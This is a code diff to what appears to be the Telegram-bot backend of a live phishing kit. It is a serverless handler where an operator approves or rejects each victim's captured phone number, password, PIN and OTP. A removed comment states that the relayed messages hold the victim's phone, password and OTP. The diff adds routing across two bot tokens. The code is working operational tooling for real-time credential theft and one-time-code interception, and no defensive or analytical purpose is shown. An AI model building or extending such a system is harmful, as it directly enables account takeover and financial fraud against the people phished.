@@ -1,6 +1,10 @@
 const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));
 
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+// ── Bot credentials ──────────────────────────────────────────────────────────
+const BOT1_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const BOT2_TOKEN = process.env.TELEGRAM_BOT_TOKEN_2;
+
+// ── Redis helpers ─────────────────────────────────────────────────────────────
 const REDIS_URL = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 
@@ -10,16 +14,30 @@ async function redisSet(key, value, exSeconds = 600) {
     });
 }
 
-async function answerCallback(callbackQueryId, text) {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+async function redisGet(key) {
+    const res = await fetch(`${REDIS_URL}/get/${key}`, {
+        headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
+    });
+    const json = await res.json();
+    return json.result; // string | null
+}
+
+// ── Pick the right token based on stored botType ──────────────────────────────
+function getToken(botType) {
+    return botType === 'secondary' ? BOT2_TOKEN : BOT1_TOKEN;
+}
+
+// ── Telegram API helpers ──────────────────────────────────────────────────────
+async function answerCallback(token, callbackQueryId, text) {
+    await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false })
     });
 }
 
-async function editMessage(chatId, messageId, newText) {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+async function editMessage(token, chatId, messageId, newText) {
+    await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -31,6 +49,7 @@ async function editMessage(chatId, messageId, newText) {
     });
 }
 
+// ── Main handler ──────────────────────────────────────────────────────────────
 exports.handler = async (event) => {
     if (event.httpMethod !== 'POST') return { statusCode: 405, body: 'Method Not Allowed' };
 
@@ -40,56 +59,56 @@ exports.handler = async (event) => {
 
     const data = cb.data || '';
     const chatId = cb.message.chat.id;
-    const messageId = cb.message.message_id;
+    const msgId = cb.message.message_id;
     const cbId = cb.id;
-    const origText = cb.message.text || ''; // The original text containing phone/password/otp
+    const origText = cb.message.text || '';
 
-    // ── Login decisions ──────────────────────────────────────────────
+    // Extract sessionId from callback data (format: "action:sessionId")
+    const sessionId = data.split(':')[1];
+
+    // Look up which bot was assigned to this session
+    const botType = (sessionId && await redisGet(`session:${sessionId}:botType`)) || 'primary';
+    const token = getToken(botType);
+
+    // ── Login decisions ──────────────────────────────────────────────────────
     if (data.startsWith('login_ok:')) {
-        const sessionId = data.split(':')[1];
         await redisSet(`session:${sessionId}:login`, 'approved');
-        await answerCallback(cbId, '✅ Approved!');
-        await editMessage(chatId, messageId, `✅ *Login Approved*\n\n${origText}`);
+        await answerCallback(token, cbId, '✅ Approved!');
+        await editMessage(token, chatId, msgId, `✅ *Login Approved*\n\n${origText}`);
     }
     else if (data.startsWith('login_wrong_number:')) {
-        const sessionId = data.split(':')[1];
         await redisSet(`session:${sessionId}:login`, 'wrong_number');
-        await answerCallback(cbId, '❌ Wrong Number');
-        await editMessage(chatId, messageId, `❌ *Wrong Number*\n\n${origText}`);
+        await answerCallback(token, cbId, '❌ Wrong Number');
+        await editMessage(token, chatId, msgId, `❌ *Wrong Number*\n\n${origText}`);
     }
     else if (data.startsWith('login_wrong_password:')) {
-        const sessionId = data.split(':')[1];
         await redisSet(`session:${sessionId}:login`, 'wrong_password');
-        await answerCallback(cbId, '❌ Wrong Password');
-        await editMessage(chatId, messageId, `❌ *Wrong Password*\n\n${origText}`);
+        await answerCallback(token, cbId, '❌ Wrong Password');
+        await editMessage(token, chatId, msgId, `❌ *Wrong Password*\n\n${origText}`);
     }
 
-    // ── PIN decisions ────────────────────────────────────────────────
+    // ── PIN decisions ────────────────────────────────────────────────────────
     else if (data.startsWith('pin_ok:')) {
-        const sessionId = data.split(':')[1];
         await redisSet(`session:${sessionId}:pin`, 'approved');
-        await answerCallback(cbId, '✅ PIN Correct!');
-        await editMessage(chatId, messageId, `✅ *PIN Approved*\n\n${origText}`);
+        await answerCallback(token, cbId, '✅ PIN Correct!');
+        await editMessage(token, chatId, msgId, `✅ *PIN Approved*\n\n${origText}`);
     }
     else if (data.startsWith('pin_wrong:')) {
-        const sessionId = data.split(':')[1];
         await redisSet(`session:${sessionId}:pin`, 'wrong_pin');
-        await answerCallback(cbId, '❌ Wrong PIN');
-        await editMessage(chatId, messageId, `❌ *Wrong PIN*\n\n${origText}`);
+        await answerCallback(token, cbId, '❌ Wrong PIN');
+        await editMessage(token, chatId, msgId, `❌ *Wrong PIN*\n\n${origText}`);
     }
 
-    // ── OTP decisions ────────────────────────────────────────────────
+    // ── OTP decisions ────────────────────────────────────────────────────────
     else if (data.startsWith('otp_ok:')) {
-        const sessionId = data.split(':')[1];
         await redisSet(`session:${sessionId}:otp`, 'approved');
-        await answerCallback(cbId, '✅ OTP Correct!');
-        await editMessage(chatId, messageId, `✅ *OTP Approved*\n\n${origText}`);
+        await answerCallback(token, cbId, '✅ OTP Correct!');
+        await editMessage(token, chatId, msgId, `✅ *OTP Approved*\n\n${origText}`);
     }
     else if (data.startsWith('otp_wrong:')) {
-        const sessionId = data.split(':')[1];
         await redisSet(`session:${sessionId}:otp`, 'wrong_otp');
-        await answerCallback(cbId, '❌ Wrong OTP');
-        await editMessage(chatId, messageId, `❌ *Wrong OTP*\n\n${origText}`);
+        await answerCallback(token, cbId, '❌ Wrong OTP');
+        await editMessage(token, chatId, msgId, `❌ *Wrong OTP*\n\n${origText}`);
     }
 
     return { statusCode: 200, body: 'ok' };
